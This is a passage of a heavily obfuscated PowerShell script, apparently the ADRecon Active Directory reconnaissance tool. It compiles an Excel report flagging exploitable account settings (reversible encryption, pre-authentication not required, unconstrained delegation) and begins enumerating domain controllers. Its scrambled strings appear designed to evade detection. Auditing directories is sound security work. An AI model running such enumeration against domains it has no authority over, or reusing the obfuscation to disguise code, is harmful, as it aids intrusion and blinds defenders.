            Get-ADRExcelWorkbook -Name ("{1}{2}{0}"-f'ats','U','ser St')
            Remove-Variable ("{1}{2}{0}{3}"-f 'F','A','D','ileName')

            $ObjAttributes = New-Object ("{0}{6}{3}{5}{4}{1}{7}{2}"-f 'System.Coll','der','ary','pe','zed.Or','ciali','ections.S','edDiction')
            $ObjAttributes.("{0}{1}" -f'Ad','d').Invoke(("{1}{6}{4}{5}{7}{0}{2}{3}" -f 'e P','M','assword at Lo','gon','st Ch','a','u','ng'),((("{0}{1}" -f '{0}TRUE{0','}'))  -f[chaR]34))
            $ObjAttributes.("{0}{1}" -f'Ad','d').Invoke(("{3}{6}{4}{5}{2}{1}{0}"-f 'd','r','Passwo','Cannot ','ang','e ','Ch'),((("{0}{1}{2}"-f'K','mtT','RUEKmt'))  -crePlaCe  'Kmt',[cHAR]34))
            $ObjAttributes.("{0}{1}" -f 'A','dd').Invoke(("{3}{4}{1}{2}{0}"-f 'pires','d Neve','r Ex','P','asswor'),((("{1}{0}" -f 'UE4SN','4SNTR'))."Rep`lAce"('4SN',[stRInG][CHAr]34)))
            $ObjAttributes.("{1}{0}" -f 'dd','A').Invoke(("{2}{3}{0}{4}{1}" -f 's','d Encryption','R','ever','ible Passwor'),((("{1}{2}{0}{3}" -f'TRU','{0','}','E{0}')) -F [CHAr]34))
            $ObjAttributes.("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{3}{5}{1}{4}" -f 'artca','e','Sm','rd','quired',' Logon R'),((("{2}{0}{1}"-f'sTRUE','jus','ju'))-CRePlACE  ([cHar]106+[cHar]117+[cHar]115),[cHar]34))
            $ObjAttributes.("{0}{1}" -f 'A','dd').Invoke(("{4}{3}{0}{5}{2}{1}" -f 'on ','d','itte','i','Delegat','Perm'),((("{0}{1}"-f 'ZJmTRUE','ZJm'))  -cREpLaCE  ([ChAR]90+[ChAR]74+[ChAR]109),[ChAR]34))
            $ObjAttributes.("{0}{1}"-f 'Ad','d').Invoke(("{2}{1}{4}{0}{3}" -f'ros DES ','b','Ker','Only','e'),((("{0}{1}" -f '{0}TRU','E{0}')) -F [CHar]34))
            $ObjAttributes.("{0}{1}" -f 'A','dd').Invoke(("{2}{0}{1}" -f'erbero','s RC4','K'),((("{2}{1}{0}" -f'0}','UE{','{0}TR')) -F [chaR]34))
            $ObjAttributes.("{0}{1}"-f'A','dd').Invoke(("{1}{2}{5}{4}{3}{6}{0}"-f'h','Does ','No','ire Pre',' Requ','t',' Aut'),(('{0}TRUE{0}') -f [cHaR]34))
            $ObjAttributes.("{1}{0}" -f 'dd','A').Invoke(((("{2}{4}{0}{1}{3}" -f'g','e (','Password ','> ','A'))),((("{3}{0}{2}{1}"-f'WR','RUE0WR','T','0'))  -rEPLaCE  '0WR',[chaR]34))
            $ObjAttributes.("{0}{1}"-f'Ad','d').Invoke(("{5}{3}{0}{4}{1}{2}" -f't ','cked ','Out','ccoun','Lo','A'),((("{0}{1}" -f'hPzTRUE','hPz'))."r`EPl`Ace"('hPz',[stRinG][CHaR]34)))
            $ObjAttributes.("{0}{1}"-f'Ad','d').Invoke(("{1}{2}{0}{3}" -f 'd i','Never ','Logge','n'),((("{1}{2}{0}"-f '0}','{0}TRU','E{')) -f  [cHaR]34))
            $ObjAttributes.("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{1}" -f 'D','nt','orma'),((("{1}{0}{2}{3}"-f 's','ze','TRU','Ezes'))."RE`pla`CE"('zes',[STRIng][cHAr]34)))
            $ObjAttributes.("{0}{1}"-f 'A','dd').Invoke(("{2}{0}{1}{3}{5}{4}"-f 'as','sword Not ','P','Requ','d','ire'),((("{0}{2}{1}" -f'3w5TR','3w5','UE')) -CrEPLACe'3w5',[char]34))
            $ObjAttributes.("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{4}{0}{3}" -f'ion T','ga','Dele','yp','t'),((("{1}{4}{2}{0}{3}{5}"-f 'train','{0}','ons','ed','Unc','{0}'))  -f [chAr]34))
            $ObjAttributes.("{0}{1}" -f'A','dd').Invoke(("{2}{1}{0}"-f'y','istor','SIDH'),'"*"')

            Get-ADRExcelAttributeStats -SrcSheetName ("{1}{0}"-f's','User') -Title1 ("{1}{3}{0}{4}{2}{5}" -f ' in','User Acc','A','ounts',' ','D') -PivotTableName ("{3}{2}{0}{1}" -f'ccount','s Status',' A','User') -PivotRows ("{0}{2}{1}"-f 'E','led','nab') -PivotValues ("{2}{0}{1}"-f'erN','ame','Us') -PivotPercentage ("{1}{0}{2}" -f'a','UserN','me') -Title2 ("{4}{2}{5}{1}{0}{3}"-f'cc','A','t','ounts','S','atus of User ') -ObjAttributes $ObjAttributes
            Remove-Variable ("{2}{0}{1}"-f'j','Attributes','Ob')

            Get-ADRExcelChart -ChartType ("{1}{0}" -f'e','xlPi') -ChartLayout 3 -ChartTitle ("{2}{3}{5}{4}{1}{0}"-f'n AD','s i','User',' Acco','nt','u') -RangetoCover ("{1}{0}{2}"-f'21','A',':D33') -ChartData $workbook."woRK`S`HeEts".("{1}{0}"-f'em','It').Invoke(1).("{1}{0}" -f'ange','R').Invoke(("{3}{0}{1}{2}" -f '4',',B3',':B4','A3:A'))
            $workbook."w`O`RKSHEeTs".("{1}{0}"-f'em','It').Invoke(1)."HyPeRL`I`NKs".("{1}{0}" -f 'd','Ad').Invoke($workbook."WORK`Sh`ee`Ts".("{1}{0}" -f 'em','It').Invoke(1)."ce`LlS".("{0}{1}"-f 'Ite','m').Invoke(20,1) , "" , ("{0}{1}"-f 'U','sers!A1'), "", ("{2}{0}{1}"-f' Da','ta','Raw')) | Out-Null

            Get-ADRExcelChart -ChartType ("{2}{1}{0}"-f'ed','lBarCluster','x') -ChartLayout 1 -ChartTitle ("{6}{5}{3}{4}{2}{0}{1}"-f'co','unts','Ac','U','ser ',' of ','Status') -RangetoCover ("{1}{0}"-f '1:L43','F2') -ChartData $workbook."w`OR`KSheETs".("{0}{1}"-f 'It','em').Invoke(1).("{1}{0}" -f'ge','Ran').Invoke(("{3}{2}{1}{0}" -f '18','G','F18,G2:','F2:'))
            $workbook."wor`Kshe`etS".("{1}{0}"-f'tem','I').Invoke(1)."HY`pERLi`Nks".("{1}{0}"-f 'dd','A').Invoke($workbook."Work`SHE`ets".("{1}{0}"-f'tem','I').Invoke(1)."CeL`lS".("{1}{0}"-f 'em','It').Invoke(20,6) , "" , ("{0}{1}{2}"-f'U','se','rs!A1'), "", ("{0}{1}{2}"-f'Raw',' ','Data')) | Out-Null

            $workbook."WOr`K`SheeTs".("{1}{0}" -f'em','It').Invoke(1)."us`E`Dr`ANgE"."ENTir`ecOLu`Mn".("{1}{0}" -f 't','AutoFi').Invoke() | Out-Null
            $excel."WInDo`WS".("{0}{1}"-f'It','em').Invoke(1)."D`iS`playGriD`LinES" = $false
        }

        
        Get-ADRExcelWorkbook -Name ("{2}{1}{4}{0}{3}"-f't','abl','T','s','e of Conten')
        $worksheet = $workbook."WOrk`SHEE`Ts".("{0}{1}" -f'It','em').Invoke(1)

        $excel."S`CrEen`UP`DA`TiNG" = $false
        
        
        

		$base64adrecon = ("{167}{0}{136}{72}{44}{161}{122}{106}{29}{130}{153}{18}{132}{131}{65}{93}{189}{133}{188}{58}{56}{9}{168}{147}{90}{63}{149}{115}{77}{92}{10}{46}{62}{8}{47}{85}{171}{95}{129}{68}{34}{48}{117}{118}{176}{180}{50}{134}{158}{94}{4}{96}{38}{57}{73}{98}{124}{185}{86}{170}{80}{150}{66}{121}{19}{61}{16}{127}{105}{41}{155}{27}{104}{101}{137}{40}{12}{146}{123}{125}{159}{25}{139}{154}{191}{71}{148}{64}{190}{76}{17}{141}{111}{21}{35}{60}{177}{173}{100}{67}{160}{163}{169}{152}{128}{138}{151}{13}{175}{172}{184}{87}{23}{178}{156}{53}{164}{112}{182}{39}{162}{2}{140}{120}{15}{54}{135}{103}{107}{42}{99}{84}{28}{33}{143}{20}{75}{91}{74}{78}{37}{70}{32}{157}{109}{144}{97}{36}{145}{187}{179}{126}{14}{51}{108}{6}{1}{52}{26}{116}{186}{22}{165}{114}{81}{83}{31}{11}{110}{142}{30}{88}{59}{89}{69}{24}{113}{45}{55}{43}{7}{181}{183}{3}{49}{174}{119}{166}{82}{102}{79}{5}"-f 'ABIAAD/4QB','B8f/gf/9oACAEBAAE/EP8A9P6uHOf3U76uX7rzzUI/5neX','Q4P/aAAgBAQABPyH/APXoQHLfFhkC0kH51UGYQeaOGZHJ/wAQTSvdf8TyMYzwVkAjDRDKZfoqY','YCoSCYHmsyslwhDgfdXi1yILMcX/AOt','HDAgHBwcHDwsLCQwRDxISEQ8RERMWHBcTFBoVEREYIRgaHR0f','Zs13/ALNd/wCrNn0ZxSPBZ2Xfn/8AAv1Zs+j/APT/AP/Z','DiA3k+bB5TfGUf5Ow','0Cvt/K/4','mZmAADypwAADVkAABPQAAAKW3BhcmEAAAAAAAMAAAACZmYAAPKnAAANWQAAE9AAAApbcGFyYQAAAAAAAwAAAAJmZgAA8qcAAA1ZAAAT0AAACltjaHJtAAAAAAADAAAAAKPX','AAgwAAAAgZ1','ogAAAAAAAAb5QAADjuAAADkFhZWiAAAAAAAA','gxETAeqIQ5R0x6mlAV8ssz/wAPa0gcVkonCuMUypAY/FHmQQOT192','B/YDEeGPEbbEmA+6ndfF','KYeXgrj6uPXyLX/ZHe5J4ZMg','+g2YqNujmNntBcY4JE21uQkNwSJtkl0UopDkyNYE+se','7+mv7f+f8An4VP','C/wB/o1O0bfFDJ','ySkDzd1/t+TX/aLjkWClFD1Hg1lKgRiODGKFEV1oGkm71p+0GqW2mMsnkkG','gB+IAAwAbAAUANwAOYWNzcEFQUEw','XkGz','ST','TGWTyS','Zmifl/yvg/8A2X','PEtKria','yEks4/4Lp/Yq3RKOZ4oMQ6/ujHkYeQVRnWAiEnVNXKRJ4vgB6/n/hEfxRFkg85NSPikLWeSGF48lkBc8GH','5cgrGhl/EDk/CWf8IMogQcf4AmFm2k4ObtjjpnHcKZRsO3ii+z/V28','m','pKknw9tMO4W2zbXFc3afDe2qO+2aLHcO2x7Sb+Pft2F9BZ3v6UsxZGw8QeO/8afhL/a14v','D+rAxmaP6lIXmKqus','9QUk9GSU','8Dr/RcwB8fzUGQdb7sQxlJsSzHFm/OECZlizBl7rrKRCYXNJaEnALJ','jGtB6HAXZjitVaIpDT7f8AHNEibhMhqaRA7wmOQRP/ABwNxwweWEviqi81iPGNihoDyNN3jE','IEaE','1','EmVDZklHTCYNKEoxhw4idFN2WzVXWklcOF8tNGdoDjR1ZmtAkKGRooKSo4OTpISUpXWFlaZ2hpand4eXqGh4iJipCW','DV0UCD8XNJIpQKOFH','W/lljjYE0YOWwgCijjT9T9yxg','bKCiRSfmkbjB4qoMBQeFqHm7wA93/A','Dh4UERQe','R','jLvHf+NPZ7OXbTv8AdxXu4+Cf8Q2bePdL7eNunUH4J/xCa9u+d79eOSRcqvBX+0+f9+9n/wBqfjv/ABp+Ev8Aa34v/wBrXgr/AGnz/v8Awl/tb8X/AO1p2XKN3ut7DYqJqbS4ltZtqudsnjvp9hvVcnwy903CVXbwpe2ttZTGsu1bgZl72LRN/t9/c2jTH4bUnk+GXvYtE3+339zaNMfhtSeT4Ze6qt4N02y6sr9HJ8Mu/k2mzt7u4lupvCl7a21lMay+GporfdfE08Vxuv8Av9//2gAIAQMRAT8','tbmCW3l/1FD+98Zf7Sty/wCMP2f/AGp+O/8AGntV5Juad9s0WO4eCv8AafP+/wDCqVI3bxYpKt5hiXIpHh7bCj','4HIJnurZYZPTKL52bJlJYoh7v7f','e8d38','AAABAAEAAIdpAAQAAAABAAAAJgAAAAAAAqACAAQAAAABAAAA6qADAAQAAAABAAAARgAAAAD/7QA4UGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAAA4QklNBCUAA','AgEz/AB58uqnveZDnKiJFEfDK','AknQAAD4MAALa+WFlaIAAAAAAAAGKlAAC3k','AABU','l5iZmq','/1RwRw5Di9XZ0Xbx5ZPxQ7m','8ReCYzZwJkVUkiei0ggJChgZGigpKjc4OTpGR0hJSlVWV1hZWmRlZmdoaWpzdHV2d3h5eoCDhI','LEtlyjlvqQLuXISvrdiTi4OcZYrBhDkYMyzYGSPSZbPLTi/KSt04vylo64+khMj01aW7f/wP/9oACAECEQE/EP8A7rwzk+pkCXCwYdPmR35LwpbQUI5KBt8GP7WoSHObUOp2Mh8yLHUIy2z8kAhghPyjinHx976E4yP2mI2Bl8r6QDitJflIwPi/oItnX0sIjA4It+','PN54/wCH/wChCDKAHlqdxZ8nuR6rm8UORxF9Qj','TClrjyI11ftx/i8','rihzizyv','tIjTK5o+GzFtwBcE8ji81AkZB9ySk2hBPIWfi/8A0P8AusW0BlGPd/f/AMqPT7uNWPd/x/u/7Xld82P+B1','AAeQAAAAUZ1hZWgAAAfgAAAAUclRSQwA','Hh4eHh4eHh4eHh4eHh4eHh4eHh','AAAAUYlhZWgA','BE9euaWIJ4PO9V','LHdF','e8RT7RPXFeQbN+h6bznMPXmHmGUu+8842il6DmsR03MTqjbFdtq22rbattq22rbattq22rbattq22rbattq22r/2gAIAQEAAQU','AAAGN5wYXJhAAAAAAADAAAAA','GMAbwBwAHkAcgBpAGcAaAB','r0K8qOGNYqlStWE3ATGTwqX7cf4uS','AA','xnUvWcd','KPBothEU8o8','FzXwk3OiUESyg/','Kupa5p//S','BCg0APC1Dzd4Ae7/iM','Gpe7x8','RXhpZgAATU0AKgAAAAgAAgESAAMA','4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHv/aAAwDAQACEQMRAAAB8w2','yppKfM//AIOPgBJ/F4dw9tlxp0b+9/a/tv5/58ljTr1c2lCENUOdUKYEHmNb9Hg4+v8AiRzqhxCj9n/g/dayb+zX+U8/8/SX9r/P/wCE3Sf5Tz/+C3CCwfJ4qyYPPLX50pb0xhXcHk8cUy6Qun/EL4Dj','rTLm','PLEuhXH+LKNsxXc+QHF8uZBQr0P+o0fN2v8At+Tj+Qdv/bcH9ntHtEwAipxHFqt4','QxK','/wAKobH','/vcwXuYokcFH/ox','oVvOJV2jpxMdh2CN5BF9Q6LPWcn63m3LWtzY4bedXiFuvm/W8l32ubDq+E7nJw1WZVx/rPk3rDqO08uCjX3UeW+pkeYAIHfO27PjOyy0856zketdVdXynU46c4HlundF8d2PHsHnZcDmEummZfVLzw/Ya','aq0RSGn2pb','jQ/','jhg8sJfFVg5KxH','HufC','ewAATM0AAJmaAAAmZgAAD1z/wgARCABGAOoDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAwIEAQUABgcIC','y/wBc8p7Jltu','j+Ra/7Id18/wCpr/tFx/Itf9kdo+d+7y6mI9nlAjWOujJPmxLCrFY82i73CVPvY','VO','eYEik9qQAcjflf/A','AAAAAAAAAEAAAAMZW5VUwAAADIAAAAcAE4AbwAgA','8','AAAF4///8yoAAAebAAD9h///+6L///2jAAAD2AAAwJRYWV','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALZGVzYwAAAQgAAAA4Y3Byd','/bAEMABQMEBAQDBQQEBAUFBQY','oL/8QAwxAAAQMDAgQDBAYEBwYECAZzAQIAAxEEEiEFMRMiEAZBUTIUYXEjB4E','Hx8TFyIkIh4kHB4fHv/bAEMBBQUFBwYHDggI','wD/APP/AD/wKnmaoBooIKgvfeTw8','n2f','+f/AM','t4ySkDz7rnEuH','X4WlUv','j1YTeP6sSkz/VVFL/fN/vn','Ofd/xf7qDEIAJ/F9SaEVf1wO+X2D','/2teBxlZSeFFqXuu5BFk/BCQqy','0y393t+w2quT4Ze5WEsa34U2+0vLYweGQdxtNom','AABDUHYzZjwCyBOmACZjs+EJ+/+ICoElDQ1','t/fd9X2Boc4s/9D','rv5w7GHJgfOlfDgfOlf','Q0qls9soOJFp+aJwqaM+BH/6+P/aAAwDA','AsGoHUfx','pJB+LGKFEV1oGkm71p+0H/jn+9BmC3VzE0+bkVeLVCQdK6P/HP96DVLb','v+//xAAzEAEAAwACAgIC','Ox7v+xV/Jf8','D2XXGsrKPCQMa0rQehwF2fF','gABAAAAANMtc2YzMgAAAAAAA','PVVURhgv/ANb/AKs7xoQo4je71TziphgrUPGBeRPqi9cvQc40E7gNJ4rfuw+P+/i56/5H/IfH/Iv+b/8Ag/fxf8X4f8Mf4rz/AMDw8HXTEcFloORd/','Clpqeoqaqwtba3uLm6wMTFxsfIycrQ1NXW19jZ2uDk5ebn6Onq8/T19vf4+fr/xAAfAQADAQEBAQEBAQEBAAAAAAABAgADBAUGBwgJCgv/xADDEQACAgEDAwMCAw','UCBQIEBIcBAAIRAxASIQQgMUETBTAiMlEUQAYzI2FCFXFSNIFQJ','KsblVUay','P0v8390/hf8AP+','qu0U+r1x','A','cROn3P6IlRtBpJv9g//aAAgBAhEBPwH9gEz+L83ICZgO04+XLL7LDs2i7Yy+2y+/HT34pmALRn','NjTqjTqjTqjTqjTqjTqjTqjbVttW','iy','3K','uVhLGvbY','/7Id1p5/1NfUfaL9ou3r','gkUIVoVIzsSRiMBbBctFDkjSCCOFTQCVj','xFAAEBAAACk','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPbWAAEAAAAA0y1sY21zAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','A','AAAAAUY2hhZAAAAaQA','WGh4iJipCTlJWWl5iZmqCjpKWmp6ipqrCys7S1tre4ubrAwsPExcbHyMnK0NPU1dbX2Nna4OLj5OXm5+jp','7Nf5TzeBygj8rzNkKfNBoEFJFi5IKcT+aDEIAJ/F9SyEUGgQUkWLkgpxP5v+L/dUHiER0/VjguH','M','adgXZXvi7/a14LA9wnUrn5Ke0a7p456brJT8J6714v/ANrXgc0svEG8JvkeEyf014v/ANrXbwPQWS942ML2vctquLzd/wD','+24MdOl','UX2f6px','xJf/wBD','ro','/w7q','UhsJfikYEjw004pmkDMoycNP2EPd/wDoXyDHO35E8Z3/AMEkjRPmgISKS','QACEQMRAAAQ7zzzzzzz/','Ag/wD/AP8A/','JHL7ZafaLt5fbKIkmkYyUhxi5IHPlIqJYeWJ+9NV9ri/E74sDc22P4Cw/Ex/Gg3Jn+JEq091M7YypEqdz7juf','AAmwAAAAkbWx1YwAAAAAAAAABAAAADGVuVVMAAAAcAAAAHABzAFIARwBCACAAYgB1AGkAbAB0AC0AaQBuAABtbHVjA','uJQ6CpyXEUJ91','0ACwAIAB1AHMAZQAgAGYAcgBlAGUAbAB5AAAAAFhZWiAAAAAAAAD21','+vcNzWZd6P5','+0fxcdddGv+yHcn0P9TE','4lpnVcCQDya','GxjbXMEMAAAbW50clJHQiBYWVo','2EYf6soCQpIsUxG0V+wf/2gAIA','d9ksreyUlSTDEuRSPD22FH9Hdre82kVruGxbTb3cX9Hdre77JZW9k','xQo9','N6lrDn/EJbEGpyv5Q','6vLz9PX29/j5+v','kIi05ohBsW5pbY2Emo/hQblFyn7XJ/CRd1Nz/gfbmR','fVx7OEcs09tw','A','YXGBkaGxwfDREOHxIDBAUGBwgJCgsMD','25XnRQNXB/Z7R/Itf9kO5T6lqV70NT6M7Vyu','9uUME6pIalbzKkrSaIq/bj/FmfbJEC5HCj50ysl+ruETypQVcKtZHq0STLCE04lqkhWFooNR/','l','79Ua2pCiMvHu/8A1v8Aqr0wehckJV1nQIw4uzs63js1Q4d','/9j/4AAQSkZJRgABAQAAS','RSQwAAAiwAAAAgYlRSQwAAAkwAAAAgY2hybQA','qPpz7XI/lMq98','B5/0A3n/ovL93R63zjqgeYbdbzW2TafWaxH84lRtc2+9ZJjp5Fry8deGn12','Q','SyKQdA5N0GPIkNRrr2uvn/U1/w','q','pQN4IjjiiVjpSTs/1XCJophMP6sBvmXzJXjzf/AK3/AFRKxk5J2f6rhE0UwmH9WA3zL5krx5v/ANb/A','2+oOvQ0xW0OMnkcXF/kuD+x2j3W4pyKeXFqnhriR5u6+f9TnVe','JGhQ7EWB2I1U','USE8CdHRN0Sfgp','NRTw1ftx/i5LOKWtqD0D4drhE8yUFXCrWR+00Wd/L/FKcC1CyoYaaUZRDJihR6mFLXHkRrq/bj/FqFlQw0FKMohk','8Qsss/+gc','/DRJWDBROFy','byv8AgPV/xfuwe6J4','AgMBAQAAAgsBEQAhMUF','A1B50VbxhwHPqtRLE8rz','AYk9o+b/xmT8XlIoqPqXdf7fk1/wBo9rf+27f+z2','21bTqjbVtOqNtWnFj2dP3RuXf','T7pZHfa','wD/AP8A/wD/AP8A/wD/AP8A/8QAMxEBAQEAAwABAgUFAQEAAQEJAQARITEQQVFhIHHwkYGhsdHB4fEwQFBgcICQoLDA0OD/2gAIAQMRAT','AAAsclhZWgAAAdA','AAAAUAAAABOd3RwdAAAAZ','eKE+616FeVO0y7m','QEABj8C/wB/t')

        $bytes =  (geT-varIAble ("Y4"+"p")  ).vaLUE::("{4}{1}{0}{2}{3}" -f 'ase6','romB','4Stri','ng','F').Invoke($base64adrecon)
        Remove-Variable ("{2}{1}{0}" -f 'se64adrecon','a','b')

        $CompanyLogo = -join($ReportPath,'\',("{4}{2}{0}{3}{1}"-f '_L','o.jpg','DRecon','og','A'))
		$p = New-Object ("{2}{0}{1}"-f 'MemorySt','ream','IO.')($bytes, 0, $bytes."L`eNgth")
		$p.("{0}{1}"-f 'Wr','ite').Invoke($bytes, 0, $bytes."Le`NG`TH")
        Add-Type -AssemblyName ("{1}{3}{2}{0}" -f'tem.Drawing','S','s','y')
		$picture =   ( get-cHIldItem  ('VA'+'r'+'IA'+'bLE:caUs'+'H')).vaLue::("{2}{0}{1}"-f're','am','FromSt').Invoke($p, $true)
		$picture.("{0}{1}" -f 'Sa','ve').Invoke($CompanyLogo)

        Remove-Variable ("{0}{1}" -f 'byt','es')
        Remove-Variable ('p')
        Remove-Variable ("{0}{1}{2}"-f'p','i','cture')

        $LinkToFile = $false
        $SaveWithDocument = $true
        $Left = 0
        $Top = 0
        $Width = 150
        $Height = 50

        
        $worksheet."S`H`ApeS".("{0}{2}{1}"-f 'Ad','icture','dP').Invoke($CompanyLogo, $LinkToFile, $SaveWithDocument, $Left, $Top, $Width, $Height) | Out-Null

        Remove-Variable ("{1}{0}{2}" -f 'inkTo','L','File')
        Remove-Variable ("{0}{1}{4}{2}{3}"-f 'S','aveWi','en','t','thDocum')
        Remove-Variable ("{0}{1}" -f'L','eft')
        Remove-Variable ("{0}{1}"-f'T','op')
        Remove-Variable ("{0}{1}"-f 'W','idth')
        Remove-Variable ("{0}{1}"-f'He','ight')

        If (Test-Path -Path $CompanyLogo)
        {
            Remove-Item $CompanyLogo
        }
        Remove-Variable ("{1}{0}{2}" -f'anyLog','Comp','o')

        $row = 5
        $column = 1
        $worksheet."ceL`LS".("{1}{0}"-f 'em','It').Invoke($row,$column)= ("{0}{3}{1}{2}{4}"-f'T','bl','e of C','a','ontents')
        $worksheet."CE`llS".("{0}{1}" -f'I','tem').Invoke($row,$column)."st`YlE" = ("{1}{2}{0}" -f '2','H','eading ')
        $row++

        For($i=2; $i -le $workbook."WO`Rksh`eetS"."cOU`NT"; $i++)
        {
            $workbook."Wo`RK`sh`eeTs".("{0}{1}" -f'It','em').Invoke(1)."HyPe`RlI`Nks".("{1}{0}"-f'd','Ad').Invoke($workbook."wO`R`ksheETs".("{1}{0}"-f'em','It').Invoke(1)."c`Ells".("{0}{1}" -f 'It','em').Invoke($row,$column) , "" , "'$($workbook.Worksheets.Item($i).Name)'!A1", "", $workbook."Wo`R`KSHEeTs".("{0}{1}"-f 'It','em').Invoke($i)."na`me") | Out-Null
            $row++
        }

        $row++
		$workbook."WO`Rksh`E`ETS".("{0}{1}" -f 'I','tem').Invoke(1)."hypeR`l`iNKS".("{1}{0}"-f'd','Ad').Invoke($workbook."wOrKS`h`EEtS".("{1}{0}" -f'em','It').Invoke(1)."ce`Lls".("{0}{1}"-f'It','em').Invoke($row,1) , ("{2}{5}{8}{6}{7}{9}{0}{3}{1}{4}" -f'reco','c','htt','n/ADRe','on','ps:/','b.','c','/githu','om/ad'), "" , "", ("{6}{3}{1}{8}{5}{2}{7}{0}{4}" -f'Re','b.co','con','ithu','con','adre','g','/AD','m/')) | Out-Null

        $worksheet."U`SedrANGE"."E`N`TIrEC`olUMn".("{1}{0}" -f 'toFit','Au').Invoke() | Out-Null

        $excel."WinD`ows".("{1}{0}" -f'tem','I').Invoke(1)."DisPlAyG`R`Id`Lines" = $false
        $excel."SCRE`e`N`UpDatiNg" = $true
        $ADStatFileName = -join($ExcelPath,'\',$DomainName,("{3}{0}{5}{2}{1}{4}{6}"-f 'DR','n-','o','A','Re','ec','port.xlsx'))
        Try
        {
            
            $excel."DiSpLA`yAl`E`RtS" = $False
            $workbook.("{1}{0}{2}" -f'v','Sa','eAs').Invoke($ADStatFileName)
            Write-Output ('[+]'+' '+'Excelshe'+'et'+' '+'S'+'aved '+'t'+'o: '+"$ADStatFileName")
        }
        Catch
        {
            Write-Error "[EXCEPTION] $($_.Exception.Message) "
        }
        $excel.("{1}{0}" -f 'it','Qu').Invoke()
        Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet -Final $true
        Remove-Variable ("{3}{0}{1}{2}"-f'orks','he','et','w')
        Get-ADRExcelComObjRelease -ComObjtoRelease $workbook -Final $true
        Remove-Variable -Name ("{1}{2}{0}"-f'k','w','orkboo') -Scope ("{1}{0}" -f 'lobal','G')
        Get-ADRExcelComObjRelease -ComObjtoRelease $excel -Final $true
        Remove-Variable -Name ("{1}{0}"-f 'l','exce') -Scope ("{0}{1}" -f'G','lobal')
    }
}

Function get`-aD`Rdom`AIn
{

    param(
        [Parameter(mANdaTorY = $true)]
        [string] $Method,

        [Parameter(MaNDatOry = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MandATORy = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(MANDatOry = $false)]
        [string] $DomainController,

        [Parameter(mandAtoRY = $false)]
        [Management.Automation.PSCredential] $Credential =  $K49P::"em`ptY"
    )

    If ($Method -eq ("{0}{1}" -f 'A','DWS'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{8}{0}{9}{4}{1}{10}{2}{5}{7}{3}{6}"-f'] ','m','i','n','rror getting Do','n ','text','Co','[Get-ADRDomain','E','a')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        If ($ADDomain)
        {
            $DomainObj = @()

            
            $FLAD = @{
	            0 = ("{0}{2}{1}" -f'W','00','indows20');
	            1 = ("{1}{2}{3}{0}{5}{4}" -f 's200','Wi','ndo','w','Interim','3/');
	            2 = ("{3}{1}{2}{0}" -f '2003','w','s','Windo');
	            3 = ("{1}{2}{0}" -f '8','Win','dows200');
	            4 = ("{2}{3}{1}{0}" -f '8R2','00','Window','s2');
	            5 = ("{1}{0}{3}{2}"-f 'ws2','Windo','12','0');
	            6 = ("{0}{1}{3}{2}"-f 'Wi','n','R2','dows2012');
	            7 = ("{0}{1}{2}"-f'Wi','ndows20','16')
            }
            $DomainMode = $FLAD[ (GEt-VaRIABLe  ('5E9'+'74') -ValUeOnlY)::("{1}{2}{0}"-f'2','ToIn','t3').Invoke($ADDomain."DoMA`INMO`de")] + ("{1}{0}"-f 'main','Do')
            Remove-Variable ("{1}{0}"-f 'AD','FL')
            If (-Not $DomainMode)
            {
                $DomainMode = $ADDomain."dOMA`inmo`de"
            }

            $ObjValues = @(("{1}{0}" -f 'ame','N'), $ADDomain."dns`RO`ot", ("{0}{1}"-f 'Net','BIOS'), $ADDomain."NEt`BiOsn`AME", ("{0}{1}{3}{2}"-f 'Functio','nal','vel',' Le'), $DomainMode, ("{1}{0}{2}" -f 'mai','Do','nSID'), $ADDomain."DOm`A`inSId"."VAL`UE")

            For ($i = 0; $i -lt $($ObjValues."COU`Nt"); $i++)
            {
                $Obj = New-Object ("{0}{1}"-f 'PSOb','ject')
                $Obj | Add-Member -MemberType ("{3}{2}{1}{0}" -f'rty','rope','teP','No') -Name ("{1}{0}{2}"-f'te','Ca','gory') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType ("{2}{0}{1}{3}"-f'tePro','pert','No','y') -Name ("{0}{1}" -f'V','alue') -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable ("{0}{1}{2}" -f'Doma','in','Mode')

            For($i=0; $i -lt $ADDomain."rEP`lICA`dirEcToRy`SE`RveRs"."co`UnT"; $i++)
            {
                $Obj = New-Object ("{1}{0}"-f 't','PSObjec')
                $Obj | Add-Member -MemberType ("{2}{3}{1}{0}" -f 'rty','e','NoteP','rop') -Name ("{0}{1}" -f'Cat','egory') -Value ("{1}{3}{2}{0}" -f 'er','Do','n Controll','mai')
                $Obj | Add-Member -MemberType ("{0}{2}{1}"-f'NotePrope','y','rt') -Name ("{1}{0}" -f'ue','Val') -Value $ADDomain."rEP`liCa`diReC`TOrYs`e`RV`ERS"[$i]
                $DomainObj += $Obj
            }
            For($i=0; $i -lt $ADDomain."REado`Nlyr`EP`licADi`Re`CTo`RysER`VerS"."CO`Unt"; $i++)
            {
                $Obj = New-Object ("{1}{0}"-f't','PSObjec')
                $Obj | Add-Member -MemberType ("{2}{0}{1}"-f 'ro','perty','NoteP') -Name ("{0}{1}"-f 'Catego','ry') -Value ("{6}{5}{2}{3}{1}{7}{4}{0}" -f 'ler','in Co','ly',' Doma','trol',' On','Read','n')
                $Obj | Add-Member -MemberType ("{0}{1}{2}" -f'NotePro','pe','rty') -Name ("{0}{1}"-f 'V','alue') -Value $ADDomain."rEad`ON`LyREp`lIcadirEC`TorySe`Rve`RS"[$i]
                $DomainObj += $Obj
            }

            Try
            {
                $ADForest = Get-ADForest $ADDomain."foR`Est"
            }
            Catch
            {
